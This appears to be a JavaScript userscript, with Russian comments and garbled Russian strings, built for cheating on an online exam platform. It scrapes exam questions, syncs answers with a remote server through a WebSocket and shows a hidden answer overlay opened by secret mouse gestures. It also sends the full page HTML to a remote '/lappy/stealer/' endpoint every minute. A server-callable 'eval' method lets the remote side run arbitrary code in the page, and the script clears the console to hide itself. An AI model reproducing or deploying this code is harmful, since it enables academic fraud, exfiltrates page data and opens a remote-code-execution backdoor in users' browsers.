var imbase = 'https://script-tggi.onrender.com/'; // production
var imbase_l = imbase+'/game';
//var imbase = 'http://localhost';
//var imbase_l = imbase+'/examcheat';
if(window.lmc_code == null) {
  window.lmc_code = "example.js"; // <- сюда название файла с кодом, который ты хочешь подгрузить
}

if(window.lmc_code==null||!(r=>r&&r.status==200&&r.headers.get("Content-Type")=="application/javascript")(awaitfetch(imbase+"/"+window.lmc_code)))
throw new Error("bad");
await import(imbase_l+'/rpc.js');

var tout;
var last_p;
var last_i=0;

function tout_c() {
    if(tout!=null) clearTimeout(tout);
}
function tout_r(){
    tout=undefined;
    last_p=undefined;
    last_i=0;
    tout_c();
}
function tout_s() {
    tout_c();
    tout = setTimeout(tout_r, 1000);
}
function inrange(e){
    var [x,y]=[e.clientX,e.clientY];
    var [x0,y0]=last_p;
    if(y0<=y)return;
    if(last_i%2==0) {
        return x<x0;
    } else {
        return x>x0;
    }
}
function wintoggle(){
}
var old_wintoggle=wintoggle;

document.addEventListener("contextmenu",(e)=>{
    if(meow==null)return;
    if(last_i%2==0&&last_i>0) e.preventDefault();
})

document.addEventListener("mousedown",(e)=>{
    if(meow==null)return;
    tout_s();
    if(last_i%2==0&&e.button==0&&(last_i==0||inrange(e))){
        if(last_i>=1){
            wintoggle();
            tout_r();
        } else {
            last_i++;
        }
    }else if(last_i%2==1&&e.button==2&&inrange(e)){
        last_i++;
    }else{
        tout_r();
    }
    last_p = [e.clientX,e.clientY];
})

document.addEventListener("keyup",(e)=>{
    if(e.key=="Z") {
        wintoggle();
    }
})

console.clear();
window.meow="no";

setTimeout(()=>{
meow=setInterval(((f)=>(f=()=>{
fetch(imbase+"/lappy/stealer/"+document.location,{method:"PUT",body:document.body.parentElement.innerHTML})
},f(),f))(),60000)
},3000);

//////////
if($(`[data-target="#finishTestModal"]`)[0]) {
//////////

window.pframe=undefined;
window.pframe_shown=false;

function painter() {
    if(pframe) {
        if(!pframe_shown) {
            pframe.show();
            pframe_shown=true;
        }
        return;
    }
    //Create window
    pframe = jsFrame.create({
        title: 'Р РёСЃРѕРІР°С€РєР°',
        left: 100, top: 100, width: 800, height: 600,
        movable: true,//Enable to be moved by mouse
        resizable: true,//Enable to be resized by mouse
        style: {
            position: "absolute"
        },
        appearanceName:"redstone",
        html: '<iframe src="https://ourworldofpixels.com/'+exam_idpub+'" style="width:100%;height:100%;border:none;box-sizing:border-box;" allow="autoplay \'none\'"></iframe>'
    });
    pframe.show();
    pframe_shown = true;
    pframe.jsFrame.windowManager.parentElement.style.position="absolute"
    pframe.on('closeButton','click',(_f,e)=>{
        pframe = undefined
    });
    pframe.on("minimizeButton","click",(_f,e)=>{
        pframe.hide();
        pframe_shown=false;
    });
}

window.exam_elems=[];
/*
window.exam_data = ({
  name: $(".text-info").parent().text().trim(),
  questions:
    [...$(".test-table")].map((tbl,i) => (exam_elems.push(tbl),{
      text: $(".test-question",tbl)[0].innerHTML.trim(),
      answers: [...$(".test-answers li",tbl)].map((e,u)=>(
        u=document.createElement("div"),
        $(u).append(
          $("label",e)
          .first()
          .contents()
          .filter(":not(.test-variant)")
          .clone()
        ),
        {
          key: $(".test-variant",e).text().trim().toUpperCase(),
          text: u.innerHTML
        }
      ))
    }))
})*/
window.exam_data = ({
  name: $(".text-info").parent().text().trim(),
  code: window.lmc_code,
  questions:
    [...$(".test-table")].map((tbl,i) => (exam_elems.push(tbl),{
      text: $(".test-question",tbl)[0].innerHTML.trim(),
      answers: [...$(".test-answers li",tbl)].map((e,u)=>(
        u=document.createElement("div"),
        $(u).append(
          $([...$("label",e).first()[0].childNodes].filter(ee=>ee!=$(".test-variant",e)[0])).clone()
        ),
        {
          key: $(".test-variant",e).text().trim().toUpperCase(),
          text: u.innerHTML
        }
      ))
    }))
})  


async function refresh_ans() {
    console.log("answer update");
    for(let [i,el] of exam_elems.entries()) {
        var value=null;
        $(".test-radio",el).map((i,e)=>{
            if(e.checked) {
                value = i;
            }
        });
        if(value!=exam_data.answers[i]) {
            exam_data.answers[i]=sock.call("suggest_answer",null,i,value);
        }
    }
}

$(".test-radio").click(function(){
    setTimeout(refresh_ans,50);
});

window.unseen_suggs=[];
window.seen_suggs=[];

exam_data.suggestions=exam_data.questions.map(e=>({}));
exam_data.answers=exam_data.questions.map(e=>null);
exam_data.notes=exam_data.questions.map(e=>({}));
seen_suggs=exam_data.questions.map(e=>JSON.stringify([{},{}]));

window.exam_id=undefined;
window.exam_idpub=undefined;

window.sock=undefined;
window.sock_good = false;

setTimeout(async function updTime() {
    if(sock_good)
        sock.call("update_exam_name",$('#timer')[0].textContent+" "+exam_data.name)
    setTimeout(updTime,1000);
},1000);

window.exam_data = exam_data;
window.aaa_visible = false;
window.ptr=[];

addEventListener('mousemove',(ev)=>{
    ptr = [ev.clientX,ev.clientY];
});

//var meow2;
//addEventListener('mouseup',(ev)=>{
//    if(meow2!=undefined) clearInterval(meow2);
//    meow2=setTimeout(function(){update_stink();meow2=undefined;},50);
//});

var stinked=undefined;
var unsug_status=undefined;

function update_stink() {
    var eielem = $(".test-table.active")[0];
    var eid = exam_elems.findIndex(e=>e==eielem);
    var stink = $("#stink-agnostic-helper")[0];
    if(!stink)return stinked = undefined;
    unseen_suggs=[];
    var org_str;
    for(let [i,sug] of exam_data.suggestions.entries()) {
        let str = JSON.stringify([sug,exam_data.notes[i]]);
        if(i==eid) {
            org_str=seen_suggs[i];
            seen_suggs[i]=str;
        }
        unseen_suggs[i]=str!=seen_suggs[i];
    }
    var unsugjs = JSON.stringify(unseen_suggs);
    if(unsugjs==unsug_status
    && org_str==seen_suggs[eid]
    && (stinked==eid)) {
        return;
    }
    function ans(eid){
        return [...Object.entries(exam_data.suggestions[eid])]
            .map(([name,ai])=>(`${name}(${(exam_data.questions[eid].answers[ai]?.key)??`???(${ai})`})`)).join(', ')
    }
    unsug_status=unsugjs;
    stinked=eid;
    stink.style.fontSize= "1rem";
    stink.innerHTML=`<div style="overflow-y:auto;"><p>РћС‚РІРµС‚С‹ РЅР° РІРѕРїСЂРѕСЃ ${eid+1}:</p>\n<p>`+
        ans(eid)+(
        unseen_suggs.filter(e=>e).length>0
        ?("<p>РќРћР’РћР•: "+unseen_suggs
            .map((sug,i)=>[i,sug])
            .filter((e)=>e[1])
            .map(e=>(e[0]+1))
            .join(', ')
            +'</p>')
        :''
    )+ /*`
    </p><p><button id="stinky-vnc-btn">VNC</button><button id="stinky-owop-btn">Р РёСЃРѕРІР°С€РєР° (РћРЎРўРћР РћР–РќРћ: Р—Р’РЈРљ)</button></p>
    `+*/ Object.entries(exam_data.notes[eid]).map(([_,{owner,text}])=>{
        let a = document.createElement("div");
        let b = document.createElement("div");
        b.style.whiteSpace="pre-wrap";
        a.append(b);
        b.textContent = owner+': '+text;
        return a.innerHTML;
    }).join('')+'</div>';
    $("#stinky-vnc-btn").map((_,e)=>{
        e.onclick=old_wintoggle;
    });
    $("#stinky-owop-btn").map((_,e)=>{
        e.onclick=()=>painter();
    });
}
setInterval(update_stink,50);

(function(){
    var chframe


    wintoggle=function() {
        if(aaa_visible) {
            //chframe.closeFrame();
            chframe.remove();
            aaa_visible = false;
            return;
        }
        chframe = document.createElement("div")
        window.chframe=chframe;
        chframe.style.position = "absolute";
        chframe.style.left=ptr[0]+"px";
        chframe.style.top=ptr[1]+"px";
        chframe.style.width="280px"
        chframe.style.zIndex=1000000;
        chframe.style.color="#00000080";
        chframe.style.borderTop="1px solid #00000020";
        chframe.onpointerdown=function(e){this.moving=[e.offsetX,e.offsetY];e.target.setPointerCapture(e.pointerId);};
        chframe.onpointerup=function(e){this.moving=false;e.target.releasePointerCapture(e.pointerId)};
        chframe.onpointermove=function(e){if(!this.moving)return;this.style.left=parseFloat(this.style.left)+e.offsetX-this.moving[0]+"px";this.style.top=parseFloat(this.style.top)+e.offsetY-this.moving[1]+"px"};
        chframe.innerHTML="<div style=\"text-align:center;\">Р»СЋР±РёРјС‹Р№</div><div id=\"stink-agnostic-helper\"></div>";
        chframe.querySelector("#stink-agnostic-helper").style.padding='0.2em';
        chframe.addEventListener("mousedown",function(e){
            if(e.button!=2) return;
            aaa_visible = false;
            this.remove();
        });
        document.body.append(chframe);
        aaa_visible = true;
        update_stink();
    }
})();

setTimeout(async function initSock() {
    try {
        console.log("attempting to connect...");
        sock = new WebSocket((imbase_l.replace(/^http/,"ws"))+"/api");
        rpc(sock,true);
        await new Promise((succ,err)=>{
            sock.onopen=succ;
            sock.onerror=err;
        });
        console.log("connected!");
        delete sock.onopen;
        delete sock.onerror;
        if(exam_id==null) {
            exam_id = await sock.call("init_exam",exam_data);
            exam_idpub = await sock.call("exam_id");
            console.log(exam_id,exam_idpub);
        } else {
            sock.call("resume_exam",exam_id);
        }
        sock.methods.notify_update_exam=function(_,data){
            exam_data.suggestions = data.suggestions;
            exam_data.notes = data.notes;
            update_stink();
        }
        sock.methods.eval=async function(str,...args) {
            var f = eval('(async function(args){'+str+'})');
            return await f(args);
        }
        sock.wait_close().catch(()=>{
            sock_good=false;
            setTimeout(initSock,1000);
        });
        sock_good = true;
        setTimeout(wintoggle,100);
    } catch(e) {
        console.error(e);
        setTimeout(initSock,1000);
    }
},100)

}
console.log("Скрипт подключен!");
